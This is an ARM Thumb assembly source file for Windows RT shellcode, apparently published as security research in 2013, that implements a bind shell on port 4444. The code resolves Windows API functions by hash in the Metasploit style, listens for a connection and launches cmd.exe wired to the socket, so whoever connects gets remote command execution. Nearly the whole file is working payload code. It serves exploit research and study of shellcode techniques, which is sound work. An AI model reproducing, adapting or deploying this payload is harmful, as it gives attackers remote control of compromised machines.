; Title:     Windows RT ARM Bind Shell (Port 4444)
; Date:      July 28, 2013
; Author:    Matthew Graeber (@mattifestation)
; Blog post: http://www.exploit-monday.com/2013/07/WinRT-ARM-Shellcode.html
; Tested on: Microsoft Surface RT Tablet w/ Windows RT (6.2.9200)
; License:   BSD 3-Clause
; Syntax:    MASM

; Notes: In order for this to work properly, you have to call this payload
;        at baseaddress + 1 since it is thumb code.
;        This was built with armasm.exe from Visual Studio 2012


	AREA	|.foo|, CODE, THUMB
	; After linking, the resulting executable will only
	; have a single section (with RX permissions) named .foo

	EXPORT	main

main
	push        {r4,lr}		; Preserve registers on the stack
	bl          ExecutePayload	; Execute bind shell function
	pop         {r4,pc}		; Restore registers on the stack and return to caller


GetProcAddress
; ARM (Thumb) implementation of the logic from the Metasploit x86 block_api shellcode
	push        {r1-r11,lr}		; Preserve registers on the stack
	mov         r9,r0		; Save the function hash in R9
	mrc         p15,#0,r3,c13,c0,#2	; R3 = &TEB
	ldr         r3,[r3,#0x30]	; R3 = &PEB
	ldr         r3,[r3,#0xC]	; R3 = PEB->Ldr
	movs        r6,#0		; R6 = 0
	ldr         r1,[r3,#0xC]	; R1 = Ldr->InLoadOrderModuleList
	ldr         r4,[r1,#0x18]	; R4 = LDR_DATA_TABLE_ENTRY.DllBase
	ldr         r3,[r1,#0x2C]	; R3 = LDR_DATA_TABLE_ENTRY.BaseDllName
	ldr         r7,[r1,#0x30]	; R7 = LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer
	str         r3,[sp]		; Store BaseDllName.Length/MaximumLength on the stack
	cbz         r4,exit_failure	; If DllBase == 0, you've likely reached the end of the module list. Return 0.
	mov         r10,#0xD		; R10 = ROR value (13)
	mov         r11,#0xD		; R11 = ROR value (13)
get_module_hash     ; Improvement: Need to validate MaximumLength != 0
	ldrh        r5,[sp,#2]		; BaseDllName.MaximumLength
	movs        r2,#0		; i = 0
	cbz         r5,get_export_dir	; Reached the last char of BaseDllName
ror_module_char
	ldrsb       r3,[r7,r2]		; R3 = (CHAR) *((PCSTR) BaseDllName.Buffer + i)
	rors        r0,r6,r10		; Calculate the next portion of the module hash
	cmp         r3,#0x61		; Is the character lower case?
	blt         notlowercase
	adds        r3,r3,r0		; Add to the running hash value
	subs        r6,r3,#0x20		; Convert character to upper case
	b           get_next_char
notlowercase
	adds        r6,r3,r0		; Add to the running hash value
get_next_char
	adds        r2,#1		; Move to the next character
	cmp         r2,r5		; Reached the last character in the module name?
	bcc         ror_module_char	; If not, move on to the next character
get_export_dir
	; At this point, the module hash has been calculated.
	; Now begin calculating the function hash
	ldr         r3,[r4,#0x3C]	; IMAGE_DOS_HEADER.e_lfanew - i.e. offset to PE IMAGE_NT_HEADERS
	adds        r3,r3,r4		; PIMAGE_NT_HEADERS
	ldr         r3,[r3,#0x78]	; IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress (only an RVA at this point)
	cbz         r3,get_next_module	; Move to the next module if it doesn't have an export directory (i.e. most exe files)
	adds        r5,r3,r4		; Calculate export dir virtual address
	ldr         r3,[r5,#0x20]	; R3 = PIMAGE_EXPORT_DIRECTORY->AddressOfNames
	ldr         r7,[r5,#0x18]	; R7 = PIMAGE_EXPORT_DIRECTORY->NumberOfNames
	movs        r0,#0
	adds        r8,r3,r4		; AddressOfNames VA
	cbz         r7,get_next_module	; Move on to the next module if there are no exported names
calc_func_hash
	ldr         r3,[r8],#4		; R3 = Current name RVA
	movs        r2,#0
	adds        lr,r3,r4		; lr = Current name VA
get_func_char
	ldrsb       r3,[lr]		; Load char from the function name
	rors        r2,r2,r11		; Calculate the next portion of the function hash
	adds        r2,r2,r3		; Add to the running hash value
	ldrsb       r3,[lr],#1		; Peek at the next char
	cmp         r3,#0		; Are you at the end of the function string?
	bne         get_func_char	; If not, calculate hash for the next char.
	adds        r3,r2,r6		; Add the module hash to the function hash
	cmp         r3,r9		; Does the calulated hash match the hash provided?
	beq         get_func_addr
	adds        r0,#1
	cmp         r0,r7		; Are there more functions to process?
	bcc         calc_func_hash
get_next_module
	ldr         r1,[r1]		; LDR_DATA_TABLE_ENTRY.InLoadOrderLinks.Flink
	movs        r6,#0		; Clear the function hash
	; Improvement: The following portion is redundant
	ldr         r4,[r1,#0x18]	; R4 = LDR_DATA_TABLE_ENTRY.DllBase
	ldr         r3,[r1,#0x2C]	; R3 = LDR_DATA_TABLE_ENTRY.BaseDllName
	ldr         r7,[r1,#0x30]	; R7 = LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer
	cmp         r4,#0		; DllBase == 0?
	str         r3,[sp]		; Store BaseDllName.Length/MaximumLength on the stack
	bne         get_module_hash
exit_failure
	movs        r0,#0		; Return 0 upon failure to find a matching hash
exit_success
	pop         {r1-r11,pc}		; Restore stack and return to caller with the function address in R0
get_func_addr
	ldr         r3,[r5,#0x24]	; R3 = PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals
	add         r3,r3,r0,lsl #1
	ldrh        r2,[r3,r4]		; R2 = Ordinal table index
	ldr         r3,[r5,#0x1C]	; R3 = PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions
	add         r3,r3,r2,lsl #2
	ldr         r3,[r3,r4]		; Function RVA
	adds        r0,r3,r4		; R0 = Function VA
	b           exit_success

ExecutePayload
	; Improvement: None of the calls to GetProcAddress
	;  validate that a valid address was actually returned
	; Metasploit shellcode doesn't perform this validation either. :P
	push        {r4-r11,lr}		; Preserve registers on the stack
	subw        sp,sp,#0x214	; Allocate soace on the stack for local variables
	movs        r3,#0x44		; sizeof(_PROCESS_INFORMATION)
	add         r2,sp,#0x38		; R2 = &StartupInfo
	movs        r1,#0
init_mem1
	; Improvement: I could just initialize everything on the stack to 0
	strb        r1,[r2],#1		; Set current byte to 0
	subs        r3,#1
	bne         init_mem1
	movs        r3,#0x10		; sizeof(_STARTUPINFOW)
	add         r2,sp,#0x28		; R2 = &ProcessInformation
init_mem2
	strb        r1,[r2],#1		; Set current byte to 0
	subs        r3,#1
	bne         init_mem2

	ldr         r0,HASH_LoadLibraryA
	bl          GetProcAddress
	mov         r3,r0
	adr         r0,module_name	; &"ws2_32.dll"
	blx         r3			; LoadLibrary("ws2_32.dll");
	ldr         r0,HASH_WsaStartup
	bl          GetProcAddress
	mov         r4,r0
	ldr         r0,HASH_WsaSocketA
	bl          GetProcAddress
	mov         r5,r0
	ldr         r0,HASH_Bind
	bl          GetProcAddress
	mov         r6,r0
	ldr         r0,HASH_Listen
	bl          GetProcAddress
	mov         r7,r0
	ldr         r0,HASH_Accept
	bl          GetProcAddress
	mov         r8,r0
	ldr         r0,HASH_CloseSocket
	bl          GetProcAddress
	mov         r9,r0
	ldr         r0,HASH_CreateProcess
	bl          GetProcAddress
	mov         r10,r0
	ldr         r0,HASH_WaitForSingleObject
	bl          GetProcAddress
	mov         r11,r0
	mov         r0,#0x0202
	add         r1,sp,#0x80
	blx         r4			; WSAStartup(MAKEWORD(2, 2), &WSAData);
	movs        r3,#0
	movs        r2,#0
	movs        r1,#1
	movs        r0,#2
	str         r3,[sp,#4]
	str         r3,[sp]
	blx         r5			; s = WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
	movs        r3,#2		; service.sin_family = AF_INET;
	strh        r3,[sp,#0x18]
	movs        r3,#0		; service.sin_addr.s_addr = 0;
	str         r3,[sp,#0x1C]
	mov         r3,#0x5C11		; service.sin_port = HTONS(4444);
	movs        r2,#0x10
	add         r1,sp,#0x18
	strh        r3,[sp,#0x1A]
	mov         r5,r0		; WSASocketA returned socket (s)
	blx         r6			; Bind( s, (SOCKADDR *) &service, sizeof(service) );
	movs        r1,#0
	mov         r0,r5
	blx         r7			; Listen( s, 0 );
	movs        r2,#0
	movs        r1,#0
	mov         r0,r5
	blx         r8			; AcceptedSocket = Accept( s, 0, 0 );
	mov         r4,r0
	mov         r0,r5
	blx         r9			; CloseSocket( s ); Close the original socket
	mov         r3,#0x101		; StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	str         r3,[sp,#0x64]
	movs        r3,#0x44		; StartupInfo.cb = 68;
	str         r3,[sp,#0x38]
	add         r3,sp,#0x28
	str         r3,[sp,#0x14]
	add         r3,sp,#0x38
	str         r3,[sp,#0x10]
	movs        r3,#0
	str         r3,[sp,#0xC]
	str         r3,[sp,#8]
	str         r3,[sp,#4]
	movs        r3,#1
	adr         r1,cmdline		; &"cmd"
	str         r3,[sp]
	movs        r3,#0
	movs        r2,#0
	movs        r0,#0
	str         r4,[sp,#0x78]	; StartupInfo.hStdError = (HANDLE) AcceptedSocket;
	str         r4,[sp,#0x74]	; StartupInfo.hStdOutput = (HANDLE) AcceptedSocket;
	str         r4,[sp,#0x70]	; StartupInfo.hStdInput = (HANDLE) AcceptedSocket;
	blx         r10			; CreateProcessA( 0, "cmd", 0, 0, TRUE, 0, 0, 0, &StartupInfo, &ProcessInformation );
	ldr         r0,[sp,#0x28]
	mvn         r1,#0
	blx         r11			; WaitForSingleObject( ProcessInformation.hProcess, INFINITE );
	addw        sp,sp,#0x214
	pop         {r4-r11,pc}

HASH_WaitForSingleObject
	DCD         0x601d8708
HASH_CreateProcess
	DCD         0x863fcc79
HASH_CloseSocket
	DCD         0x614d6e75
HASH_Accept
	DCD         0xe13bec74
HASH_Listen
	DCD         0xff38e9b7
HASH_Bind
	DCD         0x6737dbc2
HASH_WsaSocketA
	DCD         0xe0df0fea
HASH_WsaStartup
	DCD         0x006b8029
HASH_LoadLibraryA
	DCD         0x0726774c

cmdline
	DCB "cmd", 0x0

module_name
	DCB "ws2_32.dll", 0x0


	END